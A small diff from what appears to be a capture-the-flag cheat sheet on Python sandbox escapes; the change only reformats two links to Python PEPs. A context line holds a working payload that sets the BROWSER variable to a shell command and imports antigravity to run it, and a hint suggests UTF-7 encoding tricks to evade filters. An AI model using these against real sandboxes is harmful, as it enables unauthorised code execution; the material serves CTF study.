@@ -110,7 +110,7 @@ Example payloads to reuse:
 __import__('antigravity',setattr(__import__('os'),'environ',dict(BROWSER='/bin/sh -c "/readflag giveflag" #%s')))
 ```
 Tricks that might be helpful:
-- [https://peps.python.org/pep-3131/](Non-ascii identifiers get
-  translated to ascii ones.)
-- [https://peps.python.org/pep-0263/](You can change the encoding of
-  the file with a comment. Changing to utf-7 is especially useful.)
+- [Non-ascii identifiers get translated to ascii
+  ones.](https://peps.python.org/pep-3131/)
+- [You can change the encoding of the file with a comment. Changing to
+  utf-7 is especially useful.](https://peps.python.org/pep-0263/)
